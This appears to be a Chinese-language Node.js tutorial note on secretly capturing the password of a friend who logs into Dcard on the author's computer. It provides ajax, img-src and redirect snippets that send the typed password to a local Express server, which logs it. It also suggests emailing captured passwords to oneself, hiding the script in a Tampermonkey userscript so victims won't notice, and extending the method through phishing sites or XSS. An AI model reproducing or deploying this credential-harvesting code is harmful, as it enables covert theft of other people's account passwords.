---
title: nodeJS實戰-給別人登入時監聽密碼

---

# nodeJS實戰-給別人登入時監聽密碼

dcardPassword
dcard.js
node.js

## 前情提要

當你的朋友要在你的電腦上登入帳號，卻又不想要給你看他密碼，
在那邊小心翼翼，死也不要讓google帳號記住，各種防備，
啊明明都已經願意在你電腦登入，意思是能讓你用他的帳號，還要防備密碼被你知道，
這種人超G8啦。
這時候，就需要寫一個後端來接收資料，這邊我用nodeJS。


有很多名詞跟觀念我整理在另一個筆記裡面：
[nodeJS筆記-接收ajax傳值方法以及細節](https://hackmd.io/RCW-97jERmycwlAPMEKQ9A)

原理就只是node接收資料，最基礎那種XD。

## 目標效果

![image](https://hackmd.io/_uploads/rkHnMX0nT.png)

當前端打資料之後，nodejs後端要穩穩地接受一下密碼，並且console.log出來，
當然也可以不要這麼明目張膽，可以把password存入txt，
或是去找發email的API，將密碼傳給自己的信箱，這樣驚喜感更強烈XD (?

## 思路理清

### 此文狀況:在你的電腦操作
以要登入的頁面是dcard來說好了：

你朋友或同學使用你的電腦登入-->打了帳號跟密碼在D卡頁面-->點選登入-->此時發送請求到自己的後端伺服器-->後端console出來或是想辦法儲存

以上的例子是對方拿你的電腦來登入，這是一個極為罕見的特例，
因為達到這個境界，你已經[社交工程](https://scitechvista.nat.gov.tw/Article/c000003/detail?ID=c39a6e42-653b-469e-89a9-7e2579657fa5)完成了駭客工作的99%，存取只是那1%小工作。
大多數時候能到這種程度，對方應該不會介意告訴你密碼。

### 延伸狀況:在user自己的電腦操作
下面我要開展一個延伸的狀況，也是比較常見的流程：

使用者在自己的電腦上-->連線到了D卡網頁-->打了帳號跟密碼在D卡頁面-->點選登入-->此時發送請求到自己的後端伺服器-->後端console出來或是想辦法儲存

為了達到駭人帳密，在上面的流程中那些地方可能有漏洞可以鑽？或是應該在哪切入？
應該重點在於：【連線到了D卡網頁】這個步驟。
以下是我設想了幾種可能：

1.使用者看似到D卡，其實連線到的是你的釣魚網站，需要有很像的域名。
2.在D卡的頁面上，有XSS漏洞，因此注入程式碼後，可以塞自己的發送請求。

### 極少見的特例狀況:另一種原理

再延伸另一種機率很低也很難達成的特例狀況：CSRF攻擊。(跨站請求偽造)

這個狀況的話，發生的流程就不是在【連線到了D卡網頁】這個地方，而是使用者瀏覽你的網站，
而你的網站透過iframe或是某個允許跨域的元素發送請求，
假設你已經登入過低卡，沒被登出，那麼就虎假虎威你的會員身分，去做增刪查改。

[這篇標題拼錯了，但文章還可以:CRSF攻击看这一篇就够了](https://www.jianshu.com/p/84c32ced3832)

[什麼是 CSRF 攻擊？如何防範？](https://www.explainthis.io/zh-hant/swe/what-is-csrf)

詳情我這邊就不展開了，這個危險性偏低，很多網站或瀏覽器都已經做好預防措施。

## 流程操作
我們先確定一下後端接收的路徑。

我這邊就設定為：

`http://localhost:3000/get?password=密碼在這邊`

這樣子確定之後就可以開始分析前端跟後端的寫法囉！


## 前端的布置

前端傳送資料詳細去分類的話，
應該可以說有三種模式：
第一種是透過網址發送，第二個是ajax，第三種是表單。

以下是各種方法的寫法示範。
### 透過網址發送的方式

1.直接轉址到該地址

`location.href="http://localhost:3000/get?password=密碼在這邊"`

2.透過img或iframe或是相關有src的元素發送

```
<img src="http://localhost:3000/get?password=密碼在這邊">
```

### 使用ajax去發請求

這個方法的話則是透過GET以及data傳值

```
url = "http://localhost:3000/get";
//data={'password':'???'}

$.ajax({
  url: url,
  method: "GET",
  dataType: "json",
  data: 'password=這就是密碼',

  success: function (res) {
    console.log(res);
  },
  error: function (err) {
    console.log(err);
  },
});
```

### 表單的方法

這邊跟原本該網頁登入應該就相同，我先不寫，有需求再補。

## 後端的布置

後端接收資料的話也有不同的寫法。

1.從網址上的query分析，使用套件為url.parse
```
var data = url.parse(req.url, true).query.password || "";
```

[node.js中的url.parse方法使用举例](https://www.jb51.net/article/278295.htm)

[Node.js v21.6.2 documentation](https://nodejs.org/api/url.html)

2.從req的內容去解析，使用套件為bodyParser
呼叫資料的時候用 `data=req.body`

以下的程式碼我就用第一種，感覺比較直覺也比較簡單常見：
```javascript=
const express = require("express");
const url = require("node:url");
const app = express();
const port = 3000;

app.get("/get", function (req, res) {
  var password = url.parse(req.url, true).query.password || "";
  console.log(password);
});

app.listen(port, () => {
  console.log(`Server is running on http://loccalhost:${port}`);
});

```

## 實際執行準備

已經完成所有程式碼了，程式部分完成之後，接下來要做的就是設置陷阱。
也就是要先把伺服器開著、埋好程式碼。

開伺服器的話毫無疑問就是先運行著，沒什麼問題，照理說也不太會被發現。

埋好程式碼在D卡登入的頁面則是有兩種做法，
第一種開啟devtool先丟JS碼後，再給人家登入。

第二種使用油猴，最安全，畢竟外行也不會發現，
這個方式可以避免對方突然重新整理或是自己重開網頁。


## 心得總結

coding完畢！

筆記就到這邊，剩下的就是個人實行結果囉。
